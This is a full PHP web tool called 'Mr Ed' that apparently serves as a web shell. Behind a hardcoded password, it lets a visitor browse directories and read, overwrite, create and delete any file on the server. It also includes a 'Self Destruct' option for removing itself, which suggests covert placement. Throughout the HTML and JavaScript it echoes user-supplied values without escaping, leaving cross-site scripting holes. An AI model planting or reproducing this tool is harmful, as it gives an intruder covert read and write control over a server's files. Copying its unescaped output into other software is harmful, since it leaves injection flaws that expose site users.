<?php 

// -------------------------------------
// CONFIGURATION
$password = 'password99';
$hk_ascii_file_field = 70;
$hk_ascii_edit_field = 69;
$hk_ascii_submit_btn = 71;
// -------------------------------------


function get_dir_contents($pathtofile)
{
    try{
        // if($pathtofile == "/"){
            // $newpath = "/";
        // }else{
            // $newpath = $pathtofile."/";
        // }
// 
        // echo $newpath;
        //$dircontents = [];
        //$dircontents = scandir("/tmp/");

        $dir = $pathtofile;
        if (is_dir($dir)){
          if ($dh = opendir($dir)){
            while (($file = readdir($dh)) !== false){
               $dircontents[] = $file;
            }
            closedir($dh);
          }
        }
   
        $dir_array = array();
        $file_array = array();
        $max_length = 0;
    
        foreach ($dircontents as $direntry) {
    
            if (is_dir($pathtofile . '/' . $direntry)) {
    
                $dir_array[] = $direntry;
            }
            else {
    
                $file_array[] = $direntry;
                $filesize = filesize($pathtofile . '/' . $direntry);
    
                if (strlen($filesize) > $max_length) {
                    $max_length = strlen($filesize);
                }
    
            }
        }
    
        $dir_string = "<dir>";
        $pad1 = 5; // strlen of <dir>
        $pad2 = $max_length; // max strlen of filesize
    
        if ($pad1 > $pad2) {
            $amt_to_pad = $pad1 + 1;
        }
        else {
            $amt_to_pad = $pad2 + 1;
        }
    
        foreach ($dir_array as $dir) {
            $dirfielddata .= str_pad($dir_string, $amt_to_pad) . $dir . "\n";
        }
    
        foreach ($file_array as $file) {
            $dirfielddata .= str_pad(filesize($pathtofile . "/" . $file), $amt_to_pad) . $file . "\n";
        }
    
        return $dirfielddata;
    }catch(Exception $e){
        echo $e->getMessage();
    }
}


if ($_POST)
{

    if ($_POST['password'] == $password)
    {

        if ($_POST['selfdestruct'])
        {

            // TODO: figure out issue here, may be on RNT side
            //if (unlink($_SERVER['SCRIPT_FILENAME']))
            // if (false)
            //{
            //  $message = "Self destruct successful.  I no longer exist.";
            //}
            //else {
            //  $message = "Unable to self destruct.  I still exist!";
            //}

            $modeclass = "warning";
            $lastaction = "selfdestruct";
            $dirfielddata = "";
            $editfielddata = "";

        }
        // path is valid and is a file
        elseif ( is_file($_POST['pathtofile']) )
        {

            if (!$_POST['deletefile'])
            {

                // If no file contents were posted -- OR -- the pathtofile field was
                // changed, read the file contents and display to the user.
                if ((strlen($_POST['filedata']) == 0) || ($_POST['pathtofile'] != $_POST['oldpathtofile']))
                {
                    $message = "File read.";
                    $modeclass = "reading";
                    $editfielddata = file_get_contents($_POST['pathtofile']);

                    // re-read parent directory of file
                    $dirfielddata = get_dir_contents(dirname($_POST['pathtofile']));

                    $lastaction = "fileread";
                }
                // Else, file contents were posted.  Write the file contents.
                else {
        
                    $fh = fopen($_POST['pathtofile'], "w");
        
                    if ($fh) {
                        $message = "File written.";
                        $modeclass = "writing";
                        fwrite($fh, $_POST['filedata']);
                        fclose($fh);
                        $lastaction = "filewrite";
                    }
                    else {
                        $message = "Unable to write to file!";
                        $modeclass = "warning";
                    }
        
                    $editfielddata = $_POST['filedata'];
                    $dirfielddata = get_dir_contents(dirname($_POST['pathtofile']));
                }
    
            }
            else {
                
                if (unlink($_POST['pathtofile']))
                {
                    $message = "File deleted.";
                    $modeclass = "writing";

                    // re-read parent directory of deleted file
                    $dirfielddata = get_dir_contents(dirname($_POST['pathtofile'])); 

                    $lastaction = "filedelete";
                }
                else {
                    $message = "Unable to delete file!";
                    $modeclass = "warning";
                }
            }

            $pathtofile = $_POST['pathtofile'];
        }
    
        // path is valid and is a directory
        elseif ( is_dir($_POST['pathtofile']) )
        {
            $message = "Directory read.";
            $modeclass = "reading";
            $dirfielddata = get_dir_contents($_POST['pathtofile']);
            $lastaction = "dirread";
            $pathtofile = $_POST['pathtofile'];
        }
    
        // path is not valid but "new file" checkbox was checked
        elseif (($_POST['newfile']) && ($_POST['pathtofile'] == $_POST['oldpathtofile']))
        {

            // create new file
            $fh = fopen($_POST['pathtofile'], "w");
    
            if ($fh) {
    
                $message = "New file created!";
                $modeclass = "writing";
                fclose($fh);

                $lastaction = "filecreate";
            }
            else {
                $message = "Unable to create new file!";
                $modeclass = "warning";
    
            }
    
            // re-read parent directory of new file
            $dirfielddata = get_dir_contents(dirname($_POST['pathtofile']));

            $pathtofile = $_POST['pathtofile'];
        }
        
        // path is not valid
        else
        {
            $message = "Invalid path!";
            $modeclass = "warning";
            
            $lastaction = "invalidpath";

            $pathtofile = $_POST['pathtofile'];
        }

    }
    else
    {
        $message = "Invalid password!";
        $modeclass = "warning";
        $lastaction = 'invalidpassword';

        $pathtofile = $_POST['pathtofile'];
    }
}


?><!DOCTYPE html>
<html>
<head>
<title></title>
<style type="text/css">

* {
    font-family: "Lucida Console", "Courier New", Courier;
    font-size: 12px;
}

div.allcontent {
    width: 100%;
    height: 100%;
    position: relative;
}

div.messagegroup {
    padding: 2px 0px 0px 5px;
}

div.controlgroup {

}

div.dirfilefieldgroup {
    position: relative;
    min-height: 500px;
    height: 94%;
}

.message {
    font-weight: bold;
    width: 40%;
}

.usageinfo {
    color: #777777;
    display: block;
    float: right;
    margin-right: 35px;
}

.reading {color: #00DD00;}
.writing {color: #DD0000;}
.warning {color: #DDDD00;}

.formfield {
    color: white;
    background-color: black;
    spellcheck: false;
}

input.pathtofile {
    border: 1px solid gray;
    width: 45%;
}

input.password {
    border: 1px solid gray;
    width: 10%;
}

textarea {
    resize: none;
    padding: 5px 0px 0px 2px;
    line-height: 1.2em;
}

textarea.dirdata {
    width: 22%;
    height: 100%;
    position: relative;
    border-collapse: collapse;
    white-space: pre;
    overflow:scroll;
    /* font-size: 10px; */
}

textarea.filedata {
    height: 100%;
    width: 75%;
    position: relative;
    border-collapse: collapse;
    white-space: pre;
    overflow:scroll;
}

body {
    background-color: #333333;
    color: white;
    position: relative;
    margin: 0px;
    padding: 0px;
    width: 100%;
    height: 100%;
}

html,form {
    height: 100%;
}

</style>
</head>
<script type="text/javascript">

// last action was <?= $lastaction ?>

function focus_path() {
    document.getElementById("pathtofile").focus();

    // hack set the value and move the cursor to the end
    var old_val = document.getElementById("pathtofile").value;
    document.getElementById("pathtofile").value = '';
    document.getElementById("pathtofile").value = old_val;
}

function focus_edit() {
    document.getElementById("filedata").focus();
}

function focus_password() {
    document.getElementById("password").focus();
}

function init() {

    <?php if (($lastaction == 'dirread') || ($lastaction == 'invalidpath') || ($lastaction == 'selfdestruct')) { ?>
        focus_path();
    <? }
    elseif (($lastaction == 'fileread') || ($lastaction == 'filewrite')) { ?>
        focus_edit();
    <? }
    elseif ($lastaction == 'invalidpassword') { ?>
        focus_password();
    <? } ?>
}

function validate() {

    if (document.getElementById("newfile").checked == true) {
        if (confirm('Create new file (' + '<?= $pathtofile ?>' + '), are you sure?')) {
            return true;
        }
        else {
            document.getElementById("newfile").checked = false;
            return false;
        }
    }
    else if (document.getElementById("deletefile").checked == true) {
        if (confirm('Delete file (' + '<?= $pathtofile ?>' + '), are you sure?')) {
            return true;
        }
        else {
            document.getElementById("deletefile").checked = false;
            return false;
        }
    }
    else if (document.getElementById("selfdestruct").checked == true) {
        if (confirm('Delete myself (' + '<?= $_SERVER['SCRIPT_FILENAME']?>' + '), are you sure?')) {
            return true;
        }
        else {
            document.getElementById("selfdestruct").checked = false;
            return false;
        }
    }

}

function context(element) {

    if ((element.id == 'selfdestruct') && (element.checked == true)) {
        document.getElementById("deletefile").checked = false;
        document.getElementById("newfile").checked = false;
    }
    else if ((element.id == 'newfile') && (element.checked == true)) {
        document.getElementById("selfdestruct").checked = false;
        document.getElementById("deletefile").checked = false;
    }
    else if ((element.id == 'deletefile') && (element.checked == true)) {
        document.getElementById("selfdestruct").checked = false;
        document.getElementById("newfile").checked = false;
    }
    else if (element.id == 'dirdata') {
        focus_path();
    }

}



function keydown_handler(ele, evt) {

    console.log(ele.id);

    if ((ele.id == 'filedata') || (ele.id == 'pathtofile') || (ele.id == 'submitbutton')) {

        // tab key - insert tab character in content
        if ((ele.id == 'filedata') && (evt.which == 9)) {
    
            var start = ele.selectionStart;
            var end = ele.selectionEnd;
    
            ele.value = ele.value.substr(0, start) + "\t" + ele.value.substr(end);
            ele.selectionStart = start + 1;
            ele.selectionEnd = start + 1;
            ele.focus();
            return false;
        }

        // CTRL-E key, set focus to edit field
        else if ((evt.which == <?=$hk_ascii_edit_field?>) && (evt.ctrlKey == true)) {
            focus_edit();
        }

        // CTRL-F key, set focus to path field
        else if ((evt.which == <?=$hk_ascii_file_field?>) && (evt.ctrlKey == true)) {
            focus_path();
        }
        // CTRL-G key, set focus to submit button
        else if ((evt.which == <?=$hk_ascii_submit_btn?>) && (evt.ctrlKey == true)) {
            document.getElementById("submitbutton").focus();
        }
    }
    

}

</script>
<body onload="init();">
<form method="post">
<input name="oldpathtofile" type="hidden" value="<?= $_POST['pathtofile'] ?>" />


<div class="allcontent">

    <div class="messagegroup">
        <span class="message <?= $modeclass ?>">Mr Ed says: <?= $message ?>&nbsp;</span>
        <span class="usageinfo">Cursor movement: File field: CTRL-<?= chr($hk_ascii_file_field)?>, Edit field: CTRL-<?= chr($hk_ascii_edit_field)?>, Submit btn: CTRL-<?= chr($hk_ascii_submit_btn)?></span>
    </div>
    
    <div class="controlgroup">
        <input class="formfield pathtofile" type="text" name="pathtofile" id="pathtofile" value="<?= $pathtofile ?>" onkeydown="return keydown_handler(this,event);" />
        <input class="formfield password" type="password" name="password" id="password" value="<?= $_POST['password'] ?>" />
        <input type="submit" value="GO" id="submitbutton" onkeydown="return keydown_handler(this,event);" onclick="return validate();" />
        <input type="checkbox" name="newfile" id="newfile" value="1" onchange="context(this);" <?= (($lastaction=='')||($lastaction=='invalidpassword')||($lastaction=='dirread')||($lastaction=='fileread')||($lastaction=='filewrite')||($lastaction=='filecreate')||($lastaction=='filedelete')||($lastaction=='selfdestruct')) ? 'disabled="disabled"' : '' ?> />Create File
        <input type="checkbox" name="deletefile" id="deletefile" value="1" onchange="context(this);" <?= ((($lastaction=='')||($lastaction=='invalidpassword')||$lastaction=='dirread')||($lastaction=='invalidpath')||($lastaction=='filedelete')||($lastaction=='selfdestruct')) ? 'disabled="disabled"' : '' ?> />Delete File
        <input type="checkbox" name="selfdestruct" id="selfdestruct" value="1" onchange="context(this);" <?= (($lastaction=='')||($lastaction=='invalidpassword')) ? 'disabled="disabled"' : '' ?>/>Self Destruct
    </div>
    
    <div class="dirfilefieldgroup">
        <textarea spellcheck="false" class="formfield dirdata" name="dirdata" id="dirdata" cols="80" onfocus="context(this);"><?= $dirfielddata ?></textarea>
        <textarea spellcheck="false" class="formfield filedata" name="filedata" id="filedata" onkeydown="return keydown_handler(this,event);"><?= $editfielddata ?></textarea>
    </div>

</div>

</form>
</body>
</html>

